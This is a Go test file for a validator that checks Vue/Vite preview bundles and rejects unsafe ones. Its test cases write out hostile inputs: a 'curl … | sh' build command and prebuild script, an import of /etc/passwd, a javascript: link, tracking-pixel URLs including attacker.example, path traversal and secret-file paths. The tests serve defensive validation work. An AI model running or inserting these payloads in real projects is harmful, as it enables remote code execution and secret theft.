package skillopt

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestParsePreviewBundleAcceptsValidVueViteBundle(t *testing.T) {
	bundle, err := ParsePreviewBundle([]byte(validPreviewBundleJSON(t)))
	if err != nil {
		t.Fatalf("ParsePreviewBundle returned error: %v", err)
	}
	if bundle.Renderer != TrainPreviewRendererVueVite || bundle.BuildCommand != "npm run build" || bundle.DistDir != "dist" {
		t.Fatalf("bundle = %+v", bundle)
	}
	metadata := bundle.Metadata()
	if metadata.FileCount != 4 || metadata.Renderer != TrainPreviewRendererVueVite || len(metadata.Files) != 4 {
		t.Fatalf("metadata = %+v", metadata)
	}
}

func TestParsePreviewBundleCanonicalizesTrustedScaffoldFiles(t *testing.T) {
	source := validPreviewBundle(t)
	source.Files[1].Content = `<!doctype html><html><body><div id="app"></div><script type="module" src="/src/main.js"></script></body></html>`
	source.Files[2].Content = `
import { createApp } from 'vue'
import App from './App.vue'

createApp(App).mount('#app')
`
	encoded, err := json.Marshal(source)
	if err != nil {
		t.Fatalf("Marshal mutated bundle returned error: %v", err)
	}
	bundle, err := ParsePreviewBundle(encoded)
	if err != nil {
		t.Fatalf("ParsePreviewBundle returned error: %v", err)
	}
	files := map[string]string{}
	for _, file := range bundle.Files {
		files[file.Path] = file.Content
	}
	if files["index.html"] != previewBundleTrustedIndexHTML {
		t.Fatalf("index.html was not canonicalized: %q", files["index.html"])
	}
	if files["src/main.js"] != previewBundleTrustedMainJS {
		t.Fatalf("src/main.js was not canonicalized: %q", files["src/main.js"])
	}
}

func TestParsePreviewBundleAllowsLocalAppVueAnchors(t *testing.T) {
	source := validPreviewBundle(t)
	source.Files[3].Content = `<template><main><a href="#details">Details</a></main></template>`
	encoded, err := json.Marshal(source)
	if err != nil {
		t.Fatalf("Marshal mutated bundle returned error: %v", err)
	}
	if _, err := ParsePreviewBundle(encoded); err != nil {
		t.Fatalf("ParsePreviewBundle returned error: %v", err)
	}
}

func TestParsePreviewBundleRejectsInvalidBundles(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*PreviewBundle)
		content string
		want    string
	}{
		{
			name:    "prose",
			content: "# Landing page\n\nMarkdown output.",
			want:    "decode preview bundle JSON",
		},
		{
			name: "unsupported renderer",
			mutate: func(bundle *PreviewBundle) {
				bundle.Renderer = "latex-pdf"
			},
			want: "not supported",
		},
		{
			name: "missing required file",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files = bundle.Files[:3]
			},
			want: "missing required file",
		},
		{
			name: "unsupported package build script",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Content = `{"scripts":{"build":"curl https://example.com/install.sh | sh"}}`
			},
			want: `scripts.build must be "vite build"`,
		},
		{
			name: "extra package script",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Content = `{"scripts":{"prebuild":"curl https://example.com/install.sh | sh","build":"vite build"}}`
			},
			want: "scripts may only include build",
		},
		{
			name: "package dependencies",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Content = `{"scripts":{"build":"vite build"},"dependencies":{"vite":"latest"}}`
			},
			want: "dependencies are supplied by Gitmoot",
		},
		{
			name: "unsupported config file",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files = append(bundle.Files, PreviewBundleFile{Path: "vite.config.js", Content: "export default {};"})
			},
			want: "not supported",
		},
		{
			name: "app vue script",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[3].Content = `<template><main>Landing page</main></template><script setup>import data from '/etc/passwd?raw';</script>`
			},
			want: "must not include",
		},
		{
			name: "app vue external image",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[3].Content = `<template><main><img src="https://example.com/track.png"></main></template>`
			},
			want: "must not include",
		},
		{
			name: "app vue javascript href",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[3].Content = `<template><main><a href="javascript:alert(1)">Open</a></main></template>`
			},
			want: "must not include",
		},
		{
			name: "app vue protocol relative svg href",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[3].Content = `<template><main><svg><image href="//attacker.example/pixel.svg" /></svg></main></template>`
			},
			want: "href attributes must point to local anchors",
		},
		{
			name: "app vue non-anchor href",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[3].Content = `<template><main><a href="/external">Open</a></main></template>`
			},
			want: "href attributes must point to local anchors",
		},
		{
			name: "empty content",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Content = " \n"
			},
			want: "content is required",
		},
		{
			name: "unsafe absolute path",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "/tmp/package.json"
			},
			want: "must be relative",
		},
		{
			name: "path traversal",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "../package.json"
			},
			want: "must not traverse",
		},
		{
			name: "windows drive path",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "C:/Users/alice/package.json"
			},
			want: "drive-qualified",
		},
		{
			name: "dependency cache",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "node_modules/vue/index.js"
			},
			want: "dependency caches",
		},
		{
			name: "built output",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "dist/index.html"
			},
			want: "built output",
		},
		{
			name: "missing build command",
			mutate: func(bundle *PreviewBundle) {
				bundle.BuildCommand = ""
			},
			want: "build_command is required",
		},
		{
			name: "unsupported build command",
			mutate: func(bundle *PreviewBundle) {
				bundle.BuildCommand = "curl https://example.com/install.sh | sh"
			},
			want: `build_command must be "npm run build"`,
		},
		{
			name: "missing dist dir",
			mutate: func(bundle *PreviewBundle) {
				bundle.DistDir = ""
			},
			want: "dist_dir is required",
		},
		{
			name: "unsafe dist dir",
			mutate: func(bundle *PreviewBundle) {
				bundle.DistDir = "node_modules/.cache/dist"
			},
			want: "dist_dir",
		},
		{
			name: "unsupported dist dir",
			mutate: func(bundle *PreviewBundle) {
				bundle.DistDir = "build"
			},
			want: `dist_dir must be "dist"`,
		},
		{
			name: "secret path",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = ".env"
			},
			want: "secret",
		},
		{
			name: "uppercase secret path",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = ".NPMRC"
			},
			want: "secret",
		},
		{
			name: "secret directory",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "secrets/api.js"
			},
			want: "secret",
		},
		{
			name: "env directory",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = ".env/local.js"
			},
			want: "secret",
		},
		{
			name: "credential directory",
			mutate: func(bundle *PreviewBundle) {
				bundle.Files[0].Path = "credentials/aws.json"
			},
			want: "secret",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			content := tt.content
			if content == "" {
				bundle := validPreviewBundle(t)
				tt.mutate(&bundle)
				encoded, err := json.Marshal(bundle)
				if err != nil {
					t.Fatalf("Marshal mutated bundle returned error: %v", err)
				}
				content = string(encoded)
			}
			if _, err := ParsePreviewBundle([]byte(content)); err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("ParsePreviewBundle error = %v, want %q", err, tt.want)
			}
		})
	}
}

func validPreviewBundleJSON(t *testing.T) string {
	t.Helper()
	encoded, err := json.Marshal(validPreviewBundle(t))
	if err != nil {
		t.Fatalf("Marshal valid preview bundle returned error: %v", err)
	}
	return string(encoded)
}

func validPreviewBundle(t *testing.T) PreviewBundle {
	t.Helper()
	return PreviewBundle{
		Renderer:     TrainPreviewRendererVueVite,
		BuildCommand: "npm run build",
		DistDir:      "dist",
		Files: []PreviewBundleFile{
			{Path: "package.json", Content: `{"scripts":{"build":"vite build"}}`},
			{Path: "index.html", Content: `<div id="app"></div><script type="module" src="/src/main.js"></script>`},
			{Path: "src/main.js", Content: `import { createApp } from 'vue'; import App from './App.vue'; createApp(App).mount('#app');`},
			{Path: "src/App.vue", Content: `<template><main>Landing page</main></template>`},
		},
	}
}
